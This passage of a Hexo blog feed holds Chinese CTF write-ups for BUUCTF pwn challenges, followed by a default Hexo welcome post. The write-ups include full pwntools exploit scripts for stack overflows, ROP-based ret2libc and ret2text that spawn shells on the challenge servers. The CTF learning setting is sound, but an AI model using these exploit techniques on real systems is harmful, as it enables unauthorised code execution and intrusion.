class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>审计一下main函数里的代码,观察到只有输入1才能进下一步:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129164638161.png" alt="image-20230129164638161"></p><p>主函数能获取到的信息有限，按顺序先看一下begin()函数，发现好像是小程序一类的，1是加密，2是解密:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129164946246.png" alt="image-20230129164946246"></p><p>进入加密函数encrypt()看一下，发现gets，栈溢出漏洞出现了。这段代码大概意思就是，读取s，然后根据ascii码范围不同分别进行异或:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129165117594.png" alt="image-20230129165117594"></p><p>64位程序里面的传参方式是前六位参数为寄存器传参，故不能直接把参数写在栈里，需要通过gadgets来实现控制寄存器的值从而控制函数参数的值。我们用gadget去找一下pop rdi的地址,</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ROPgadget --binary ciscn_2019_c_1 <span class="hljs-string">| grep &quot;</span>pop rdi ; ret<span class="hljs-string">&quot; </span><br></code></pre></td></tr></table></figure><p>为0x400c83，然后通过 p64(pop_rdi_addr)+p64(参数值)+p64(函数地址) 即可调用函数:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129165443140.png" alt="image-20230129165443140"></p><p>特别注意到题目是部署在Ubuntu18上的，因此调用system需要栈对齐，这里填充ret来对齐,地址为0x4006b9:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ROPgadget --binary ciscn_2019_c_1 <span class="hljs-string">| grep &quot;</span>ret<span class="hljs-string">&quot;  </span><br></code></pre></td></tr></table></figure><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">string</span>):<br>    newstr = <span class="hljs-built_in">list</span>(string)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(newstr)):<br>        c = <span class="hljs-built_in">ord</span>(string[i])<br>        <span class="hljs-keyword">if</span> c &lt;= <span class="hljs-number">96</span> <span class="hljs-keyword">or</span> c &gt; <span class="hljs-number">122</span>:<br>            <span class="hljs-keyword">if</span> c &lt;= <span class="hljs-number">64</span> <span class="hljs-keyword">or</span> c &gt; <span class="hljs-number">90</span>:<br>                <span class="hljs-keyword">if</span> c &gt; <span class="hljs-number">47</span> <span class="hljs-keyword">and</span> c &lt;= <span class="hljs-number">57</span>:<br>                    c ^= <span class="hljs-number">0xF</span><br>            <span class="hljs-keyword">else</span>:<br>               c ^= <span class="hljs-number">0xE</span><br>        <span class="hljs-keyword">else</span>:<br>            c ^= <span class="hljs-number">0xD</span><br>        newstr[i] = <span class="hljs-built_in">chr</span>(c)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(newstr)<br><span class="hljs-comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,29403)</span><br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x0000000000400C83</span> <span class="hljs-comment">#一个万能的gadget，x64程序基本都存在，pop rdi;ret;</span><br><span class="hljs-comment">#start_addr = 0x0000000000400790</span><br>main_addr = <span class="hljs-number">0x000000000400B28</span> <span class="hljs-comment">#主函数地址</span><br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>)<br><span class="hljs-comment">#泄露puts实际地址</span><br>payload = <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br>p.sendline(encrypt(payload))<br><br><span class="hljs-comment">#print encrypt(payload)</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#接受puts的实际地址</span><br>addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#print &quot;addr=&quot;, hex(addr)</span><br><span class="hljs-comment">#此处搜寻到的libc是本机的libc-2.23.so,需要自行添加到database，</span><br><span class="hljs-comment">#具体方法可上github，搜寻libc_database项目</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, addr)<br>libcbase = addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><br><span class="hljs-comment">#print &#x27;str_bin_sh=&#x27;,hex(libc.dump(&#x27;str_bin_sh&#x27;))</span><br><span class="hljs-comment">#print libc.dump(&#x27;system&#x27;)</span><br><br>p.recv()<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>)<br>sys_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-comment">#下面为正常脚本，可以在kali中拿到shell，如果是Ubuntu18，需要在里面加ret进行栈对齐</span><br>payload = <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x58</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)<br>ret = <span class="hljs-number">0x4006b9</span><br>payload_Ubuntu18 = <span class="hljs-string">&#x27;1&#x27;</span>*<span class="hljs-number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>经典的ret2libc的题，但还是感觉有点难，后续还要再看看。这里exp引用了csdn的一篇文章,附上连接:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/qinying001/article/details/<span class="hljs-number">103266763</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6661</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>EBlogCommendFromBaidu%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">103266763</span>-blog-<span class="hljs-number">104986595</span>.pc_relevant_vip_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>EBlogCommendFromBaidu%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">103266763</span>-blog-<span class="hljs-number">104986595</span>.pc_relevant_vip_default&amp;utm_relevant_index=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h3><p>经典check，这保护开的，第一次见到这种场面的我心脏骤停:</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">Arch:</span>     i386-<span class="hljs-number">32</span>-little<br><span class="hljs-symbol">RELRO:</span>    <span class="hljs-keyword">Partial</span> RELRO<br><span class="hljs-symbol">Stack:</span>    canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure><p>IDA32打开(终于有32位的文件了QAQ)啊嘞，虽然保护开的吓人，但是这代码审计不难，大概就是让var[13]等于17就成功了::</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129170823918.png" alt="image-20230129170823918"></p><p>由于一开始就有让我们输入name，所以只需要将var数组里全填上17就可通过判断了:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25940</span>)<br><br>payload = p32(<span class="hljs-number">17</span>)*<span class="hljs-number">14</span><br><br>p.sendline(payload)<br><br>p.<span class="hljs-built_in">int</span>eractive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>寒假pwn题第一天</title>
    <link href="/2023/01/09/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <url>/2023/01/09/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%80%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><p>拿到题不管三七二十一先check一下，64位文件，无保护:</p><p><img src="/1.png" alt="1"></p><p>丢进ida64里，看汇编还是有点费劲，选择F5看伪C代码：</p><p><img src="/2.png" alt="图片2"></p><p>很容易看到第11行的gets，很明显的栈溢出。shift+f12又发现了cat flag.txt：</p><p><img src="/3.jpg" alt="图片3"></p><p>那局势就很明了了，标准的ret2text，双击进去，Ctrl+x发现在sub_40060D中调用了此字符串：</p><p><img src="/4.png" alt="图片4"></p><p>回到main函数看一下v5的长度：</p><p><img src="/5.png" alt="图片5"></p><p>万事俱全,exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28016</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span> + p64(<span class="hljs-number">0x40060D</span>) <br><br>p.sendline(payload) <br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>同样check,64位，只开了NX保护:</p><p><img src="/6.png" alt="图片6"></p><p>主函数平平无奇，调用了一个func()函数，进去看看:</p><p><img src="/7.png" alt="图片7"></p><p><img src="/8.png" alt="图片8"></p><p>代码审计，发现当v2&#x3D;11.28125时能拿到flag。我们用gets输入的是v1，只需要控制v1的长度，是v1溢出给v2填充为11.28125即可。不过要注意，这里的11.28125需要是16进制的。</p><p>附上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29450</span>) <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span>-<span class="hljs-number">0x4</span>) + p64(<span class="hljs-number">0x41348000</span>) <br><br>p.sendline(payload) <br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h3><p>check，32位，只开了NX保护:</p><p><img src="/9.png" alt="图片9"></p><p>可以看到第12行的fgets是我们的输入点，但是它只读入了32（&#x3D;0x20）长度的数据，小于0x3c，没有办法造成溢出，代码审计后发现，会把字符’I’变成’you’：</p><p><img src="/10.png" alt="图片10"></p><p>shell地址也直接给了我们:</p><p><img src="/11.png" alt="图片11"></p><p>附上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26413</span>)<br><br>payload = <span class="hljs-string">b&#x27;I&#x27;</span> * <span class="hljs-number">21</span> + <span class="hljs-string">b&#x27;a&#x27;</span> + p32(<span class="hljs-number">0x8048f0D</span>)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>假期有点懒散，考完试摆了快一个星期了QAQ，最近实验室安排了才开始学，好多都忘了。第一天就写 三道ret2text叭，之后要加加油了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/01/08/hello-world/"/>
    <url>/2023/01/08/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
